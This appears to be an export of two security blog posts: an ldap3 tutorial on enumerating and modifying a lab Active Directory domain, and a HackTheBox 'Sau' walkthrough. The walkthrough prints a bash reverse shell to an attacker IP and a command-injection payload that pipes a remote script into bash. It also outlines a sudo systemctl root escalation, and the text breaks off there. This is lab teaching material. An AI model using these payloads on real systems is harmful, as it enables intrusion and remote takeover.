[ { "title": "A Hands-On Guide to Active Directory Enumeration and Modification with ldap3", "url": "/posts/LDAP3_ADDC/", "categories": "notes", "tags": "Active Directory, ldap3, python3", "date": "2024-01-14 07:00:00 +0100", "snippet": "Overview :In this blog, we’ll embark on a journey into the world of LDAP (Lightweight Directory Access Protocol) and Active Directory. But here’s the twist – no pre-existing tools like ldapsearch, ...", "content": "Overview :In this blog, we’ll embark on a journey into the world of LDAP (Lightweight Directory Access Protocol) and Active Directory. But here’s the twist – no pre-existing tools like ldapsearch, ldapmodify, impacket, or bloodhound will be our guide. Instead, we’ll roll up our sleeves and create a simple yet powerful tool using Python3 and ldap3.Why create our tool?Because understanding the mechanics behind the tools we use is essential. Many cybersecurity enthusiasts jump straight into using tools without unraveling the magic behind them. This blog aims to demystify the process, empowering you to interact with LDAP directly and comprehend the intricacies of Active Directory enumeration, information retrieval, and object modification.What’s on the agenda?We’ll cover everything from establishing a connection to Active Directory using ldap3, searching for users and groups, to modifying and adding objects like a pro. By the end, you’ll not only grasp how these operations are performed but also be equipped to create your own LDAP-interacting tools from scratch.So, buckle up as we dive into the realm of LDAP and Active Directory, where you’ll emerge with the skills to navigate and manipulate directories with confidence. Let’s begin this journey, empowering you to be the master of your tools and the architect of your cybersecurity strategies.Introduction to ldap3 :ldap3 is a Python library for interacting with LDAP (Lightweight Directory Access Protocol) servers. It provides a convenient and Pythonic way to perform LDAP operations, such as querying, adding, modifying, and deleting entries in LDAP directories.Installation :You can download and install ldap3 directly from its GitHub source :https://github.com/cannatag/ldap3and thenpython setup.py installOr install the ldap3 library directly from pyPI:pip3 install ldap3Active directory Environment :Assuming you’ve installed Windows Server and configured Active Directory, ensure LDAP access is set up. If you’re unfamiliar with this process, refer to my previous post, Active Directory Mastery - A Guide to Windows Server Setup for Penetration Testing. Once your environment is ready, let’s Connecting to Active Directory with Python and ldap3Connecting to Active Directory with Python and ldap3 :Importing Objectwe need to imports 3 specific components from the ldap3 module:Server: Represents an LDAP server like ldap://ex.example.comConnection: Represents a connection to an LDAP server.SAFE_SYNC: Represents a synchronous (blocking) connection mode with safety checks.ALL: To retrieve all info about entriesfrom ldap3 import Server, Connection, ALLNow, we’ve imported the essential namespaces, Server and Connection. In the LDAP protocol, authentication is referred to as Bind which I explained in my LDAP post. You can refer to it for more details. In LDAP, there are three types of Bind connections: Anonymous Bind, Simple Password Bind, and SASL.Let’s start with the anonymous bindAnonymous Bind :Let’s start accessing the server with an anonymous bind:&gt;&gt;&gt; from ldap3 import Server, Connection, ALL&gt;&gt;&gt; srv = Server(\"emsec.emsec.htb\")&gt;&gt;&gt; conn = Connection(srv, auto_bind=True)so if we Displays information about the connection object, showing details like server host, port, authentication method, etc.&gt;&gt;&gt; connConnection(server=Server(host='emsec.emsec.htb', port=389, use_ssl=False, allowed_referral_hosts=[('*', True)], get_info='SCHEMA', mode='IP_V6_PREFERRED'), auto_bind='NO_TLS', version=3, authentication='ANONYMOUS', client_strategy='SYNC', auto_referrals=True, check_names=True, read_only=False, lazy=False, raise_exceptions=False, fast_decoder=True, auto_range=True, return_empty_attributes=True, auto_encode=True, auto_escape=True, use_referral_cache=False)&gt;&gt;&gt;I want you to know that there are four connection strategies: SYNC, ASYNC, RESTARTABLE, and REUSABLE. In our case, we’re using SYNC, as indicated in the conn result with client_strategy='SYN'C. This is the default strategy, which means the client waits for the server’s response before proceeding with further operations.also we Prints information about the Server object, showing details like host, port, and SSL usage the same way we do with connection :&gt;&gt;&gt; srvServer(host='emsec.emsec.htb', port=389, use_ssl=False, allowed_referral_hosts=[('*', True)], get_info='SCHEMA', mode='IP_V6_PREFERRED')&gt;&gt;&gt; print(conn)ldap://emsec.emsec.htb:389 - cleartext - user: None - not lazy - bound - open - &lt;local: 10.10.10.40:53937 - remote: 10.10.10.10:389&gt; - tls not started - listening - SyncStrategy - internal decoder&gt;&gt;&gt;From the print(conn) result, we observed that it’s a cleartext connection, which is the type the server is currently listening to. We’ll explore how to switch to SSL and how to use secure ldap later. LDAP Connection Details Syntax Description Supported LDAP Versions Server supports LDAP 2 and 3 Naming Contexts Server stores information for 3 different DIT partitions Alternative Servers This is the only replica of the database Supported Controls Optional controls that can be sent in a request operation Supported Extensions Additional extended operations understood by the server Supported SASL Mechanisms Different additional SASL authentication mechanisms Schema Entry The location of the schema in the DIT Vendor Name The brand/mark/name of this LDAP server Vendor Version The version of this LDAP server Getting Information from the server (Anonymous Bind):I should note that we are currently in an Anonymous Bind, attempting to gather information from the server.but first we need to specify the get_info=ALL parameter indicates that when establishing a connection, the client should request all available information about the LDAP server.also the auto_bind=True which indicates that the connection should be automatically established upon creation.&gt;&gt;&gt; server = Server('emsec.emsec.htb', get_info=ALL)&gt;&gt;&gt; conn = Connection(server, auto_bind=True)&gt;&gt;&gt; server.infoDSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=emsec,DC=htb CN=Configuration,DC=emsec,DC=htb CN=Schema,CN=Configuration,DC=emsec,DC=htb DC=DomainDnsZones,DC=emsec,DC=htb DC=ForestDnsZones,DC=emsec,DC=htb Supported controls: 1.2.840.113556.1.4.1338 - Verify name - Control - MICROSOFT 1.2.840.113556.1.4.1339 - Domain scope - Control - MICROSOFT 1.2.840.113556.1.4.1340 - Search options - Control - MICROSOFT 1.2.840.113556.1.4.1341 - RODC DCPROMO - Control - MICROSOFT 1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT 1.2.840.113556.1.4.1504 - Attribute scoped query - Control - MICROSOFT 1.2.840.113556.1.4.1852 - User quota - Control - MICROSOFT 1.2.840.113556.1.4.1907 - Server shutdown notify - Control - MICROSOFT 1.2.840.113556.1.4.1948 - Range retrieval no error - Control - MICROSOFT 1.2.840.113556.1.4.1974 - Server force update - Control - MICROSOFT 1.2.840.113556.1.4.2026 - Input DN - Control - MICROSOFT 1.2.840.113556.1.4.2064 - Show recycled - Control - MICROSOFT 1.2.840.113556.1.4.2065 - Show deactivated link - Control - MICROSOFT 1.2.840.113556.1.4.2066 - Policy hints [DEPRECATED] - Control - MICROSOFT 1.2.840.113556.1.4.2090 - DirSync EX - Control - MICROSOFT 1.2.840.113556.1.4.2204 - Tree deleted EX - Control - MICROSOFT 1.2.840.113556.1.4.2205 - Updates stats - Control - MICROSOFT 1.2.840.113556.1.4.2206 - Search hints - Control - MICROSOFT 1.2.840.113556.1.4.2211 - Expected entry count - Control - MICROSOFT 1.2.840.113556.1.4.2239 - Policy hints - Control - MICROSOFT 1.2.840.113556.1.4.2255 - Set owner - Control - MICROSOFT 1.2.840.113556.1.4.2256 - Bypass quota - Control - MICROSOFT 1.2.840.113556.1.4.2309 1.2.840.113556.1.4.2330 1.2.840.113556.1.4.2354 1.2.840.113556.1.4.319 - LDAP Simple Paged Results - Control - RFC2696 1.2.840.113556.1.4.417 - LDAP server show deleted objects - Control - MICROSOFT 1.2.840.113556.1.4.473 - Sort Request - Control - RFC2891 1.2.840.113556.1.4.474 - Sort Response - Control - RFC2891 1.2.840.113556.1.4.521 - Cross-domain move - Control - MICROSOFT 1.2.840.113556.1.4.528 - Server search notification - Control - MICROSOFT 1.2.840.113556.1.4.529 - Extended DN - Control - MICROSOFT 1.2.840.113556.1.4.619 - Lazy commit - Control - MICROSOFT 1.2.840.113556.1.4.801 - Security descriptor flags - Control - MICROSOFT 1.2.840.113556.1.4.802 - Range option - Control - MICROSOFT 1.2.840.113556.1.4.805 - Tree delete - Control - MICROSOFT 1.2.840.113556.1.4.841 - Directory synchronization - Control - MICROSOFT 1.2.840.113556.1.4.970 - Get stats - Control - MICROSOFT 2.16.840.1.113730.3.4.10 - Virtual List View Response - Control - IETF 2.16.840.1.113730.3.4.9 - Virtual List View Request - Control - IETF Supported extensions: 1.2.840.113556.1.4.1781 - Fast concurrent bind - Extension - MICROSOFT 1.2.840.113556.1.4.2212 - Batch request - Extension - MICROSOFT 1.3.6.1.4.1.1466.101.119.1 - Dynamic Refresh - Extension - RFC2589 1.3.6.1.4.1.1466.20037 - StartTLS - Extension - RFC4511-RFC4513 1.3.6.1.4.1.4203.1.11.3 - Who am I - Extension - RFC4532 Supported features: 1.2.840.113556.1.4.1670 - Active directory V51 - Feature - MICROSOFT 1.2.840.113556.1.4.1791 - Active directory LDAP Integration - Feature - MICROSOFT 1.2.840.113556.1.4.1935 - Active directory V60 - Feature - MICROSOFT 1.2.840.113556.1.4.2080 - Active directory V61 R2 - Feature - MICROSOFT 1.2.840.113556.1.4.2237 - Active directory W8 - Feature - MICROSOFT 1.2.840.113556.1.4.800 - Active directory - Feature - MICROSOFT Supported SASL mechanisms: GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5 Schema entry: CN=Aggregate,CN=Schema,CN=Configuration,DC=emsec,DC=htbOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=emsec,DC=htb ldapServiceName: emsec.htb:emsec$@EMSEC.HTB isGlobalCatalogReady: TRUE supportedLDAPPolicies: MaxPoolThreads MaxPercentDirSyncRequests MaxDatagramRecv MaxReceiveBuffer InitRecvTimeout MaxConnections MaxConnIdleTime MaxPageSize MaxBatchReturnMessages MaxQueryDuration MaxDirSyncDuration MaxTempTableSize MaxResultSetSize MinResultSets MaxResultSetsPerConn MaxNotificationPerConn MaxValRange MaxValRangeTransitive ThreadMemoryLimit SystemMemoryLimitPercent serverName: CN=EMSEC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=emsec,DC=htb schemaNamingContext: CN=Schema,CN=Configuration,DC=emsec,DC=htb isSynchronized: TRUE highestCommittedUSN: 323702 dsServiceName: CN=NTDS Settings,CN=EMSEC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=emsec,DC=htb dnsHostName: emsec.emsec.htb defaultNamingContext: DC=emsec,DC=htb currentTime: 20240114142516.0Z configurationNamingContext: CN=Configuration,DC=emsec,DC=htbWith server.info, we successfully retrieved information about the LDAP server using the info attribute of the Server object. However, our result is limited since we are binding as anonymous. We’ll find more useful information with Simple Password Bind and SASL Bind.Simple Password :Simply put, with a Simple Password Bind, you provide a DN (Distinguished Name) and a password. The server then checks the validity of the credentials and either permits or denies access to the elements of the DIT (Directory Information Tree). On the other hand, for SASL Bind, we use an external certificate or a Kerberos ticket to identify the user.Note : The Directory Information Tree (DIT) is a hierarchical tree structure that organizes entries within a directory server. It is a fundamental concept in LDAP (Lightweight Directory Access Protocol) and represents the organization of directory entries.Here’s an example of the syntax for a DIT:cn=John Doe,ou=Users,dc=emsec,dc=htbSimple Authentication and Security Layer (SASL) :SASL is a framework for authentication, it allows client and server to negotiate an authentication method among those supported. SASL authentication adds 4 authentication subtypes: GSS-SPNEGO : Simple and Protected GSSAPI Negotiation Mechanism, yet another protocol to negotiate authentication. Active Directory provides NTLM or Kerberos as underlaying methods. GSSAPI : Kerberos (GSSAPI is often used with Kerberos, a widely used authentication protocol that provides strong authentication and security features.) EXTERNAL : SASL EXTERNAL is a Simple Authentication and Security Layer mechanism that enables a client to authenticate itself to a server using credentials provided by the underlying transport layer, such as SSL/TLS certificates. DIGEST-MD5 : Challenge-response authentication with message digest algorithm. Logging into the server :&gt;&gt;&gt; from ldap3 import Server, Connection, ALL&gt;&gt;&gt; server = Server('emsec.emsec.htb', get_info=ALL)&gt;&gt;&gt; conn = Connection(server, 'user4', 'Password@123!', auto_bind=True)&gt;&gt;&gt; conn.extend.standard.who_am_i()'u:EMSEC0\\\\user4'&gt;&gt;&gt;we checks that we are a valid user using who_am_i() and this extended operation returns our identity u:EMSEC0\\\\user4Note: if you get empty response from conn.extend.standard.who_am_i() .This means you have no authentication status on the server, so you are an anonymous user.Establishing a secure connection :Previously, we used print(conn) to view the details of our connection, and it showed cleartext ,This means that credentials pass unencrypted over the wire (insecure LDAP: port 389). Also this raises concerns about the potential for password capture by anyone in the same network using tools like Wireshark, Such as shown below.The LDAP protocol provides two ways to secure a connection: LDAP over TLS and the StartTLS extended operation. Both methods establish a secure TLS connection: the former secure with TLS the communication channel as soon as the connection is open, while the latter can be used at any time on an already open unsecure connection to secure it issuing the StartTLS operation.&gt;&gt;&gt; from ldap3 import Server, Connection, ALL&gt;&gt;&gt; server = Server(\"emsec.emsec.htb\",use_ssl=True,get_info=ALL)&gt;&gt;&gt; conn = Connection(server, 'user4','Password@123!', auto_bind=True)&gt;&gt;&gt; tls_result = conn.start_tls()&gt;&gt;&gt; print(conn)ldaps://emsec.emsec.htb:636 - ssl - user: user4 - not lazy - bound - open - &lt;local: 10.10.10.40:43075 - remote: 10.10.10.10:636&gt; - tls not started - listening - SyncStrategy - internal decoderNow, upon checking with print(conn), we observe ssl instead of cleartext, indicating that we are now using a secure connection. However, TLS hasn’t started. This is because we haven’t specified any TLS options, and thus, there is no checking of certificate validity. To customize TLS behavior, you can provide a Tls object to the Server object (ldap3.Tls )Now with encrypted connections (SSL) a network sniffer can’t capture passwords or any other sensitive data:Searching for Users and Groups :uppose we need to enumerate LDAP using the ldap3 library. Before we begin, it’s important to note that to find entries in the DIT, you must use the Search operation. However, there are two mandatory parameters for the search operation: search_base which denotes the location in the DIT where the search will start, and search_filter a string that describes what you are searching forDump All Users :&gt;&gt;&gt; from ldap3 import Server, Connection, ALL&gt;&gt;&gt; conn = Connection(server, 'user4', 'Password@123!', auto_bind=True)&gt;&gt;&gt; conn.search('dc=emsec,dc=htb', '(objectclass=person)')True&gt;&gt;&gt; conn.entriesHere, we are requesting all entries of the class person. This will display all users on our Windows server.This operation is looking for entries in the LDAP directory that match the specified search criteriaconn.search('dc=emsec,dc=emsec,dc=htb', '(objectclass=person)')dc=emsec,dc=emsec,dc=htb : This specifies the starting point in the LDAP directory tree for the search.(objectclass=person) : This filter defines the conditions that entries must meet to be considered a match. In this case, it’s looking for entries with the objectClass attribute set to person.Dump All Groups :To dump users, we can simply change the filter from '(objectclass=person)' to '(objectclass=group)' This modification will retrieve all groups in the domain.&gt;&gt;&gt; conn.search('dc=emsec,dc=htb', '(objectclass=groups)')True&gt;&gt;&gt; conn.entries[DN: CN=Administrators,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.712388, DN: CN=Users,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.712492, DN: CN=Guests,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.712630, DN: CN=Print Operators,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.712682, DN: CN=Backup Operators,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.712723, DN: CN=Replicator,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.712827, DN: CN=Remote Desktop Users,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.714688, DN: CN=Network Configuration Operators,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.714765, DN: CN=Performance Monitor Users,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.714820, DN: CN=Performance Log Users,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.714872, DN: CN=Distributed COM Users,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.714922, DN: CN=IIS_IUSRS,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.714971, DN: CN=Cryptographic Operators,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.715019, DN: CN=Event Log Readers,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.715107, DN: CN=Certificate Service DCOM Access,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.715157, DN: CN=RDS Remote Access Servers,CN=Builtin,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T17:10:13.715203You can dump every object using various filters.LDAP Search Filter CheatsheetAdding Users and Groups :To add or modify Users, groups or Organizational Unit one must have administrator privileges or the necessary permissions. I have already granted user4 the permission to add users and groups.To clarify the permissions granted to user4, I have given them full control over the LDAP3_OU:Add new user to organizational unit :To search for all OU’s that it in the domain we use this filter :&gt;&gt;&gt;conn.search('dc=emsec,dc=htb','(objectclass=organizationalUnit)')True&gt;&gt;&gt; conn.entries[DN: OU=Domain Controllers,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T20:36:46.101068, DN: OU=XXX,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T20:36:46.101115, DN: OU=XXX,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T20:36:46.101142, DN: OU=LDAP3_OU,DC=emsec,DC=htb - STATUS: Read - READ TIME: 2024-01-14T20:36:46.101167]Now Let’s try to add users to LDAP3_OU&gt;&gt;&gt; from ldap3 import Server,Connection,ALL&gt;&gt;&gt; server = Server('emsec.emsec.htb')&gt;&gt;&gt; conn = Connection(server,'user4','Password@123!',auto_bind=True)&gt;&gt;&gt; conn.add('cn=Test_user,ou=LDAP3_OU,dc=emsec,dc=htb', 'user', {'givenName': 'TestName', 'sn': 'Test', 'departmentNumber': 'Test', 'telephoneNumber': 1111})True&gt;&gt;&gt; conn.result{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'addResponse'}&gt;&gt;&gt;As you can see, we have successfully added ‘Test_user’ to the ‘LDAP3_OU’ Organizational Unit. This occurred because we have full control permission over the OU.Note:When creating a user, you can specify additional attributes such as description, mail, and more. We will explore this further in the modify entry sectionAdd group to organizational unit :As we saw earlier, to convert an entry from a user to a group, we simply need to change the objectClass attribute from user to group&gt;&gt;&gt; conn.add('cn=Test_Group,ou=LDAP3_OU,dc=emsec,dc=htb', 'group', {'cn': 'Test_Group','description': 'Test Group'})True&gt;&gt;&gt; conn.result{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'addResponse'}&gt;&gt;&gt; Add user to group :As an administrator, I have granted user4 permission to add users to the Test_Group. This means we can accomplish this task using only user4.Rename,Modify,Update an entry :Make sure to import the necessary namespaces MODIFY_ADD, MODIFY_REPLACE, and MODIFY_DELETE. With these imported, you can then modify, rename, and update an entry as needed.&gt;&gt;&gt; from ldap3 import MODIFY_ADD, MODIFY_REPLACE, MODIFY_DELETERename an entry :Renaming an entry in LDAP means changing its RDN (Relative Distinguished Name)&gt;&gt;&gt; conn.modify_dn('cn=Test_user,ou=LDAP3_OU,dc=emsec,dc=htb', 'cn=Renamed_User')True&gt;&gt;&gt; conn.result{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modDNResponse'}&gt;&gt;&gt;Update an entry :In this section, we will change attributes such as mail, description, and more. To do this, make sure to import the necessary namespaces MODIFY_ADD, MODIFY_REPLACE, and MODIFY_DELETE, as mentioned previously. Now, let’s proceed to update the attributes of our user Renamed_user.”&gt;&gt;&gt; conn.modify('cn=Renamed_User,ou=LDAP3_OU,dc=emsec,dc=htb', {'sn': [(MODIFY_REPLACE, ['New_Value'])]})TrueTo delete the updated value :&gt;&gt;&gt; conn.modify('cn=Renamed_User,ou=LDAP3_OU,dc=emsec,dc=htb', {'sn': [(MODIFY_DELETE, ['New_Value'])]})TrueWe have successfully deleted the sn attribute of our userBuilding my Tool NexusAD :The NexusAD tool, available on GitHub, is designed to simplify Active Directory management tasks. While the tool covers a range of functionalities, I want to emphasize that it’s created solely for fun and learning. In this blog post, I’ll share some screenshots of the tool in action. The code is open for exploration and modification. Feel free to upgrade and customize the tool based on your needs. Let’s run the tool and have some fun with Active Directory management!You can find the complete source code on nexusAD.pyHow to use this simple tool ?Simply run the command python3 nexusAD.py -h to see the available functionalities of this tool :┌──(root㉿emsec)-[/opt/nexusAd]└─# python3 nexusAD.py -husage: nexusAD.py [-h] -domain DOMAIN -u USERNAME -p PASSWORD -dc DOMAIN_CONTROLLER -sf SEARCH_FILTER [-add-user ADD_USER] [-add-group ADD_GROUP] [-add-ou ADD_OU] [-modify-object MODIFY_OBJECT] [-delete-object DELETE_OBJECT]LDAP Tooloptions: -h, --help show this help message and exit -domain DOMAIN Domain name, e.g., example.com -u USERNAME, --username USERNAME Username -p PASSWORD, --password PASSWORD Password -dc DOMAIN_CONTROLLER, --domain-controller DOMAIN_CONTROLLER Domain Controller IP -sf SEARCH_FILTER, --search-filter SEARCH_FILTER Specify the LDAP search filter. For example, '(&amp;(objectClass=user)(sAMAccountName=jdoe))'. -add-user ADD_USER Add a new user -add-group ADD_GROUP Add a new group -add-ou ADD_OU Add a new Organizational Unit (OU) -modify-object MODIFY_OBJECT Modify an LDAP object -delete-object DELETE_OBJECT Delete an object, e.g., CN=emsec,CN=users,DC=example,DC=comNote: The -modify-object option is not currently functional. Consider it a next step to implement this feature in your tool. As mentioned before, this tool was created just for fun and learning purposes.Tool Options : add user :┌──(root㉿emsec)-[/opt/nexusAd]└─# python3 nexusAD.py -domain emsec.htb -u admin -p Password@123! -dc 10.10.10.10 -add-user fun_user[*] Successfully connected to LDAP server at ldap://10.10.10.10[+] User fun_user added successfully.User Path : cn=fun_user,cn=users,dc=emsec,dc=htb add group :┌──(root㉿emsec)-[/opt/nexusAd]└─# python3 nexusAD.py -domain emsec.htb -u admin -p Password@123! -dc 10.10.10.10 -add-group fun_group[*] Successfully connected to LDAP server at ldap://10.10.10.10[+] Group fun_group added successfully.User Path : cn=fun_group,cn=users,dc=emsec,dc=htb add organizational unit :┌──(root㉿emsec)-[/opt/nexusAd]└─# python3 nexusAD.py -domain emsec.htb -u admin -p Password@123! -dc 10.10.10.10 -add-ou fun_ou[*] Successfully connected to LDAP server at ldap://10.10.10.10ou=fun_ou,dc=emsec,dc=htb[*] Creatr OU :[+] Ou fun_ou added successfully.Ou Path : ou=fun_ou,dc=emsec,dc=htb dump all users :You use this LDAP Search Filter Cheatsheet┌──(root㉿emsec)-[/opt/nexusAd]└─# python3 nexusAD.py -domain emsec.htb -u admin -p Password@123! -dc 10.10.10.10 -sf '(objectclass=person)'[*] Successfully connected to LDAP server at ldap://10.10.10.10[*] Search results for filter '(objectclass=person)': [*] DN: CN=Administrator,CN=Users,DC=emsec,DC=htb [*] DN: CN=Guest,CN=Users,DC=emsec,DC=htb[*] DN: CN=EMSEC,OU=Domain Controllers,DC=emsec,DC=htb[*] DN: CN=krbtgt,CN=Users,DC=emsec,DC=htb[*] DN: CN=Amanda Walker,CN=Users,DC=emsec,DC=htb [*] DN: CN=winrm_svc,CN=Users,DC=emsec,DC=htb[*] DN: CN=user1,CN=Users,DC=emsec,DC=htb[*] DN: CN=user2,CN=Users,DC=emsec,DC=htb[*] DN: CN=user3,CN=Users,DC=emsec,DC=htb[*] DN: CN=user4,CN=Users,DC=emsec,DC=htb[*] DN: CN=Renamed_User,OU=LDAP3_OU,DC=emsec,DC=htb[*] DN: CN=lol,OU=LDAP3_OU,DC=emsec,DC=htb[*] DN: CN=user9,CN=Users,DC=emsec,DC=htb[*] DN: CN=user10,CN=Users,DC=emsec,DC=htb[*] DN: CN=admin,CN=Users,DC=emsec,DC=htb[*] DN: CN=user11,CN=Users,DC=emsec,DC=htb[*] DN: CN=fun_user,CN=Users,DC=emsec,DC=htb dump all group :┌──(root㉿emsec)-[/opt/nexusAd]└─# python3 nexusAD.py -domain emsec.htb -u admin -p Password@123! -dc 10.10.10.10 -sf '(objectclass=group)' [*] Successfully connected to LDAP server at ldap://10.10.10.10[*] Search results for filter '(objectclass=group)':[*] DN: CN=Administrators,CN=Builtin,DC=emsec,DC=htb[*] DN: CN=RAS and IAS Servers,CN=Users,DC=emsec,DC=htb[*] DN: CN=Server Operators,CN=Builtin,DC=emsec,DC=htb[*] DN: CN=Account Operators,CN=Builtin,DC=emsec,DC=htb[*] DN: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=emsec,DC=htb[*] DN: CN=Cloneable Domain Controllers,CN=Users,DC=emsec,DC=htb[*] DN: CN=Protected Users,CN=Users,DC=emsec,DC=htb[*] DN: CN=Key Admins,CN=Users,DC=emsec,DC=htb[*] DN: CN=Enterprise Key Admins,CN=Users,DC=emsec,DC=htb[*] DN: CN=DnsAdmins,CN=Users,DC=emsec,DC=htb[*] DN: CN=DnsUpdateProxy,CN=Users,DC=emsec,DC=htb[*] DN: CN=Test_Group,OU=LDAP3_OU,DC=emsec,DC=htb[*] DN: CN=fun_group,CN=Users,DC=emsec,DC=htb delete objects :┌──(root㉿emsec)-[/opt/nexusAd]└─# python3 nexusAD.py -domain emsec.htb -u admin -p Password@123! -dc 10.10.10.10 -delete-object CN=fun_user,CN=Users,DC=emsec,DC=htb[*] Successfully connected to LDAP server at ldap://10.10.10.10[+] Object CN=fun_user,CN=Users,DC=emsec,DC=htb deleted successfully.Conclusion :In conclusion, this blog has equipped you to navigate and manipulate Active Directory through Python and ldap3. By understanding the intricacies of LDAP, you’re ready to build custom tools and elevate your cybersecurity capabilities. Empower yourself to be a master of your tools and strategies in the realm of Active Directory security." }, { "title": "HackTheBox-Sau Walkthrough", "url": "/posts/HackTheBox-Sau/", "categories": "HackTheBox Walkthrough", "tags": "HackTheBox", "date": "2023-12-29 14:00:00 +0100", "snippet": "Description :Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port ...", "content": "Description :Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port 80. The privilege escalation to root is straightforward, as the Puma user can execute a service with root privileges.Nmap :Upon scanning the host’s ports, we identified two open ports: 22 and 5555 : /opt/nmapAutomator/nmapAutomator.sh -t All -H 10.10.11.224 Running all scans on 10.10.11.224Host is likely running Linux---------------------Starting Port Scan-----------------------PORT STATE SERVICE22/tcp open ssh55555/tcp open unknown---------------------Starting Script Scan-----------------------PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)| 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)|_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)55555/tcp open unknown| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 400 Bad Request| Content-Type: text/plain; charset=utf-8| X-Content-Type-Options: nosniff| Date: Fri, 29 Dec 2023 13:52:51 GMT| Content-Length: 75| invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$| GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 302 Found| Content-Type: text/html; charset=utf-8| Location: /web| Date: Fri, 29 Dec 2023 13:52:24 GMT| Content-Length: 27| href=\"/web\"&gt;Found&lt;/a&gt;.| HTTPOptions: | HTTP/1.0 200 OK| Allow: GET, OPTIONS| Date: Fri, 29 Dec 2023 13:52:24 GMT|_ Content-Length: 0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTCP - PORT 5555About Request Baskets :Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI. It is strongly inspired by ideas and application design of the RequestHub project and reproduces functionality offered by RequestBin service.We can create a basket with name choice , in this case emsec :Now, our basket is prepared and awaits incoming requests:if we try to send requests to http://10.10.11.224:55555/emsec it will apear on Request Baskets :also there is a parameters that we can modify :CVE-2023-27163 | SSRF:By examining the website versionI searched on Google for vulnerabilities in the request-baskets Version: 1.2.1 and discovered the associated steps on GitHub underCVE-2023-27163 Having identified the SSRF on the website, by implementing this modification, we can exploit it.revisiting the /emsec basket :We successfully exploited the SSRF; it is now functioning as intended.OS Command Injection on Maltrail :what is Maltrail : Maltrail is a malicious traffic detection systemUpon inspecting the bottom, we can identify the version of Maltrail. After searching for its vulnerability on Google, we came across a post regarding Unauthenticated OS Command Injection.Now, let’s proceed. Firstly, change the Forward URL: to http://127.0.0.1:80/login:After executing the injection, we received the callback, confirming the successful functioning of the OS command :Shell as puma:create your reversesehll and strat the http.server: reverse shell :┌──(emsec㉿emsec-pc)-[~]└─$ cat shell.sh #!/bin/bashbash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1\" payload :curl -X POST 'http://10.10.11.224:55555/emsec' \\ --data \"username=;'curl http://10.10.14.81/shell.sh|bash'\" Upgrading Shell to Fully Interactive TTYs :export TERM=xtermpython3 -c \"import pty;pty.spawn('/bin/bash')\"CTR+Zstty -echo raw;fgand then reading the user falg :puma@sau:/opt/maltrail$ cd /home/puma/puma@sau:~$ lsuser.txtpuma@sau:~$ cat user.txt d19b35b25e4df14c10326b***********Shell as root :Upon inspecting the privileges of the current Puma user using sudo -l, we discovered the capability to execute /usr/bin/systemctl status trail.service with root permissions.puma@sau:~$ sudo -lMatching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.serviceIt appears to be a straightforward privilege escalation. We can easily chack GTFOBinsGet root by just runningsudo /usr/bin/systemctl status trail.service then 